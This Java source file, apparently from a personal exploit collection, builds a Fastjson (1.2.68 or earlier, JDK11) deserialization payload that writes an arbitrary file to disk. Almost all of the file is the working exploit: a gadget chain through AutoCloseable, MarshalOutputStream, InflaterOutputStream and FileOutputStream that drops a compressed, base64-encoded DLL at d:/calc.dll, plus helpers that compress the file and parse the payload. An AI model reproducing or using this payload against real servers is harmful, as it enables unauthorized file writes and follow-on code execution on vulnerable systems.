package org.exploit.third.fastjson;

import com.alibaba.fastjson.JSON;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.Arrays;
import java.util.Base64;
import java.util.zip.Deflater;

public class Fastjson_WriteFile_JDK11 {
    public static void main(String[] args) throws Exception {
//        String code = gzcompress("qwerasdf");//压缩编码字符串
        //php -r "echo base64_encode(gzcompress('qwerasdf'));"
        //<=1.2.68 and JDK11
        String code = gzcompress(readFile("E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\src\\main\\java\\org\\exploit\\loadDLL\\calc.dll"));
        String payload = "{\r\n"
                + "    \"@type\":\"java.lang.AutoCloseable\",\r\n"
                + "    \"@type\":\"sun.rmi.server.MarshalOutputStream\",\r\n"
                + "    \"out\":\r\n"
                + "    {\r\n"
                + "        \"@type\":\"java.util.zip.InflaterOutputStream\",\r\n"
                + "        \"out\":\r\n"
                + "        {\r\n"
                + "           \"@type\":\"java.io.FileOutputStream\",\r\n"
                + "           \"file\":\"d:/calc.dll\",\r\n"
                + "           \"append\":false\r\n"
                + "        },\r\n"
                + "        \"infl\":\r\n"
                + "        {\r\n"
                + "            \"input\":\r\n"
                + "            {\r\n"
                + "                \"array\":\""+code+"\",\r\n"
                + "                \"limit\":763\r\n"  //需对应修改
                + "            }\r\n"
                + "        },\r\n"
                + "        \"bufLen\":1048576\r\n"
                + "    },\r\n"
                + "    \"protocolVersion\":1\r\n"
                + "}\r\n"
                + "";
        System.out.println(payload);
        JSON.parse(payload);
    }
    public static String gzcompress(String code) {
        byte[] data = code.getBytes();
        String result = gzcompress(data);
        return result;
    }

    public static String gzcompress(byte[] data){
        byte[] output = new byte[0];
        Deflater compresser = new Deflater();
        compresser.reset();
        compresser.setInput(data);
        compresser.finish();
        ByteArrayOutputStream bos = new ByteArrayOutputStream(data.length);
        try {
            byte[] buf = new byte[1024];
            while (!compresser.finished()) {
                int i = compresser.deflate(buf);
                bos.write(buf, 0, i);
            }
            output = bos.toByteArray();
        } catch (Exception e) {
            output = data;
            e.printStackTrace();
        } finally {
            try {
                bos.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        compresser.end();
        System.out.println(Arrays.toString(output));
        return Base64.getEncoder().encodeToString(output);
    }
    public static byte[] readFile(String filePath) throws IOException {
        File file = new File(filePath);
        long fileLength = file.length();
        byte[] fileData = new byte[(int) fileLength]; // 根据文件大小创建字节数组

        try (FileInputStream fis = new FileInputStream(file)) {
            fis.read(fileData); // 读取文件内容
        }

        return fileData; // 返回字节数组
    }
}
